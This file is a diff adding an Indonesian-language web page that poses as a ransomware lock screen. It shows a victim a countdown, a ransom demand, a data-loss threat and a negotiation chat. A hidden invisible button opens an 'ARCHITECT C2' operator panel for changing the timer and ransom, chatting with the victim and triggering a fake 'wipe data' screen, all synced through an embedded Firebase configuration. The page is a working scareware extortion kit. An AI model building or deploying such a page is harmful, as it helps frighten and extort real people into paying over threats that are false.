@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Security - Locked</title>
+    <!-- Tailwind CSS buat styling kenceng -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Lucide Icons buat ikon hacker -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <!-- React & Babel CDN -->
+    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap');
+        body { font-family: 'JetBrains Mono', monospace; background-color: #000; color: #00ff00; }
+        .glow-green { text-shadow: 0 0 10px #00ff00; }
+        .scrollbar-hide::-webkit-scrollbar { display: none; }
+        @keyframes progress { from { width: 100%; } to { width: 0%; } }
+        .animate-progress { animation: progress 1800s linear forwards; }
+    </style>
+</head>
+<body>
+    <div id="root"></div>
+
+    <!-- Firebase Module Script -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, doc, onSnapshot, setDoc, updateDoc, arrayUnion, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+
+        // Konfigurasi Firebase Anda yang sudah diupdate
+        const firebaseConfig = {
+            apiKey: "AIzaSyAZ98XegiDOAGJ508mCASQ1SKp-3WsonWU",
+            authDomain: "nagalocker.firebaseapp.com",
+            projectId: "nagalocker",
+            storageBucket: "nagalocker.firebasestorage.app",
+            messagingSenderId: "529236383091",
+            appId: "1:529236383091:web:bcd42c1c2c2f5714c46106",
+            measurementId: "G-S98ECJN5LY"
+        };
+
+        // Ekspor ke window agar bisa diakses script Babel
+        window.FirebaseLib = {
+            app: initializeApp(firebaseConfig),
+            getFirestore, doc, onSnapshot, setDoc, updateDoc, arrayUnion, getDoc,
+            getAuth, signInAnonymously, onAuthStateChanged
+        };
+        
+        // Trigger event bahwa Firebase siap
+        window.dispatchEvent(new Event('firebase-ready'));
+    </script>
+
+    <!-- React App Script (Babel) -->
+    <script type="text/babel">
+        const { useState, useEffect } = React;
+
+        function App() {
+            const [fbReady, setFbReady] = useState(false);
+            const [role, setRole] = useState('victim');
+            const [user, setUser] = useState(null);
+            const [state, setState] = useState({
+                timeLeft: 1800,
+                ransom: '300.000',
+                messages: [],
+                isWiping: false
+            });
+            const [input, setInput] = useState('');
+
+            useEffect(() => {
+                const handleReady = () => setFbReady(true);
+                if (window.FirebaseLib) handleReady();
+                else window.addEventListener('firebase-ready', handleReady);
+                return () => window.removeEventListener('firebase-ready', handleReady);
+            }, []);
+
+            useEffect(() => {
+                if (!fbReady) return;
+                const { getAuth, signInAnonymously, onAuthStateChanged } = window.FirebaseLib;
+                const auth = getAuth();
+                signInAnonymously(auth);
+                const unsub = onAuthStateChanged(auth, setUser);
+                return () => unsub();
+            }, [fbReady]);
+
+            useEffect(() => {
+                if (!fbReady || !user) return;
+                const { getFirestore, doc, onSnapshot, setDoc, getDoc } = window.FirebaseLib;
+                const db = getFirestore();
+                const appId = "naga-locker-real-v1";
+                const docRef = doc(db, "artifacts", appId, "public", "data", "locker_state");
+                
+                getDoc(docRef).then(snap => {
+                    if (!snap.exists()) {
+                        setDoc(docRef, {
+                            timeLeft: 1800,
+                            ransom: '300.000',
+                            messages: [{ sender: 'Hacker', text: 'HP lu udah gue pegang. Bayar atau data ilang.', time: Date.now() }],
+                            isWiping: false
+                        });
+                    }
+                });
+
+                const unsub = onSnapshot(docRef, (s) => {
+                    if (s.exists()) setState(s.data());
+                });
+                return () => unsub();
+            }, [fbReady, user]);
+
+            const sendMsg = async (sender) => {
+                if (!input.trim() || !fbReady) return;
+                const { getFirestore, doc, updateDoc, arrayUnion } = window.FirebaseLib;
+                const db = getFirestore();
+                const appId = "naga-locker-real-v1";
+                const docRef = doc(db, "artifacts", appId, "public", "data", "locker_state");
+                await updateDoc(docRef, {
+                    messages: arrayUnion({ sender, text: input, time: Date.now() })
+                });
+                setInput('');
+            };
+
+            const updateField = async (field, value) => {
+                if (!fbReady) return;
+                const { getFirestore, doc, updateDoc } = window.FirebaseLib;
+                const db = getFirestore();
+                const appId = "naga-locker-real-v1";
+                const docRef = doc(db, "artifacts", appId, "public", "data", "locker_state");
+                await updateDoc(docRef, { [field]: value });
+            };
+
+            if (!fbReady) return <div className="min-h-screen flex items-center justify-center">Memuat Sistem...</div>;
+
+            if (role === 'victim') {
+                return (
+                    <div className="min-h-screen flex flex-col p-6 relative overflow-hidden">
+                        {state.isWiping && (
+                            <div className="absolute inset-0 z-50 bg-black flex flex-col items-center justify-center text-red-600 animate-pulse">
+                                <i data-lucide="skull" className="w-20 h-20 mb-4"></i>
+                                <h1 className="text-2xl font-black">MENGHAPUS DATA...</h1>
+                            </div>
+                        )}
+                        <header className="text-center mt-10">
+                            <h1 className="text-xl font-black glow-green mb-2 animate-pulse uppercase">Device Anda Terkunci !!</h1>
+                            <p className="text-[10px] text-gray-500 mb-6 uppercase tracking-widest">Data anda akan dihapus dalam 30 menit</p>
+                            <div className="text-red-600 text-5xl font-black font-mono tracking-tighter mb-4">
+                                {Math.floor(state.timeLeft / 60)}:{(state.timeLeft % 60).toString().padStart(2, '0')}
+                            </div>
+                            <div className="w-full h-1.5 bg-gray-900 rounded-full overflow-hidden border border-green-900/20">
+                                <div className="h-full bg-green-500 animate-progress" style={{width: '100%'}}></div>
+                            </div>
+                            <p className="text-[10px] text-red-500 font-bold bg-red-950/20 py-1 border-y border-red-900 mt-4">ACCESS DENIED</p>
+                        </header>
+
+                        <div className="mt-8 bg-green-950/5 border border-green-900/20 p-5 rounded-2xl text-center">
+                            <p className="text-[10px] text-gray-400 mb-4 italic">jika ingin di buka minta PIN nya ke nomor di atas</p>
+                            <div className="flex gap-2">
+                                <button className="flex-1 bg-green-600 text-black py-3 rounded-xl text-xs font-black shadow-lg">UNLOCK</button>
+                                <div className="flex-1 bg-gray-900/50 border border-gray-800 py-3 text-xs text-gray-700 font-bold">PIN</div>
+                            </div>
+                        </div>
+
+                        <div className="flex-1 flex flex-col mt-8 overflow-hidden">
+                            <div className="text-[10px] text-gray-600 border-b border-green-900/10 pb-1 mb-2">SECURE_CHAT@HACKER: ~</div>
+                            <div className="flex-1 overflow-y-auto space-y-2 mb-4 scrollbar-hide">
+                                {state.messages.map((m, i) => (
+                                    <div key={i} className={`p-2 rounded-xl text-xs ${m.sender === 'Hacker' ? 'bg-gray-800/80 text-white border-l-2 border-green-500' : 'bg-green-950/10 text-green-500'}`}>
+                                        <span className="font-bold block mb-1 opacity-50 uppercase text-[8px]">{m.sender}:</span>
+                                        {m.text}
+                                    </div>
+                                ))}
+                            </div>
+                            <div className="relative">
+                                <input value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && sendMsg('Victim')} placeholder="silakan ketik negosiasi" className="w-full bg-black border border-green-900/30 p-4 pr-12 text-xs rounded-2xl outline-none focus:border-green-500" />
+                                <button onClick={() => sendMsg('Victim')} className="absolute right-4 top-1/2 -translate-y-1/2 text-green-500"><i data-lucide="send" className="w-5 h-5"></i></button>
+                            </div>
+                        </div>
+                        <button onClick={() => setRole('hacker')} className="fixed top-0 right-0 w-12 h-12 opacity-0 cursor-default z-50"></button>
+                    </div>
+                );
+            }
+
+            return (
+                <div className="min-h-screen bg-slate-950 text-slate-200 p-4 flex flex-col font-sans">
+                    <header className="flex justify-between items-center bg-slate-900 p-4 rounded-2xl border border-slate-800 mb-6">
+                        <div className="flex items-center gap-3">
+                            <div className="bg-red-600 p-2.5 rounded-xl"><i data-lucide="user-cog" className="text-white w-6 h-6"></i></div>
+                            <div>
+                                <h1 className="text-lg font-black italic">ARCHITECT C2</h1>
+                                <p className="text-[10px] text-slate-500 uppercase">Remote Admin Dashboard</p>
+                            </div>
+                        </div>
+                        <button onClick={() => setRole('victim')} className="bg-red-600/10 text-red-500 px-4 py-2 rounded-xl text-xs font-bold hover:bg-red-600 hover:text-white transition-all">LOGOUT</button>
+                    </header>
+
+                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                        <div className="bg-slate-900 p-6 rounded-3xl border border-slate-800 space-y-6">
+                            <h2 className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Target Control</h2>
+                            <div className="grid grid-cols-2 gap-4">
+                                <div className="bg-black/50 p-4 rounded-2xl border border-slate-800">
+                                    <p className="text-[9px] text-slate-500 mb-2 uppercase">Countdown (Minutes)</p>
+                                    <div className="flex items-center justify-between">
+                                        <span className="text-xl font-bold text-red-500">{Math.floor(state.timeLeft / 60)}m</span>
+                                        <div className="flex gap-2">
+                                            <button onClick={() => updateField('timeLeft', Math.max(0, state.timeLeft - 300))} className="bg-slate-800 p-1 rounded"> - </button>
+                                            <button onClick={() => updateField('timeLeft', state.timeLeft + 300)} className="bg-slate-800 p-1 rounded"> + </button>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div className="bg-black/50 p-4 rounded-2xl border border-slate-800">
+                                    <p className="text-[9px] text-slate-500 mb-2 uppercase">Ransom Price</p>
+                                    <input className="bg-transparent border-b border-slate-800 w-full text-lg font-bold text-white outline-none" value={state.ransom} onChange={(e) => updateField('ransom', e.target.value)} />
+                                </div>
+                            </div>
+                            <button onClick={() => updateField('isWiping', !state.isWiping)} className={`w-full py-4 rounded-2xl font-black text-xs transition-all ${state.isWiping ? 'bg-red-600' : 'bg-slate-800 text-red-500'}`}>
+                                {state.isWiping ? 'STOP WIPING' : 'WIPE DATA PERMANEN'}
+                            </button>
+                        </div>
+
+                        <div className="bg-slate-900 p-6 rounded-3xl border border-slate-800 flex flex-col h-[400px]">
+                            <h2 className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-4">Interceptor Chat</h2>
+                            <div className="flex-1 overflow-y-auto mb-4 space-y-3 bg-black/40 p-4 rounded-2xl">
+                                {state.messages.map((m, i) => (
+                                    <div key={i} className={`flex flex-col ${m.sender === 'Hacker' ? 'items-end' : 'items-start'}`}>
+                                        <div className={`max-w-[80%] p-2 rounded-xl text-[11px] ${m.sender === 'Hacker' ? 'bg-red-600 text-white' : 'bg-slate-800 text-slate-200'}`}>{m.text}</div>
+                                        <span className="text-[8px] text-slate-600 mt-1 uppercase font-bold">{m.sender}</span>
+                                    </div>
+                                ))}
+                            </div>
+                            <div className="flex gap-2">
+                                <input value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && sendMsg('Hacker')} placeholder="Balas ke korban..." className="flex-1 bg-black border border-slate-800 p-3 text-xs rounded-xl outline-none" />
+                                <button onClick={() => sendMsg('Hacker')} className="bg-red-600 p-3 rounded-xl"><i data-lucide="send-horizonal" className="w-5 h-5 text-white"></i></button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            );
+        }
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+
+        // Sync icons after render
+        const interval = setInterval(() => {
+            if (window.lucide) {
+                lucide.createIcons();
+                clearInterval(interval);
+            }
+        }, 100);
+    </script>
+</body>
+</html>
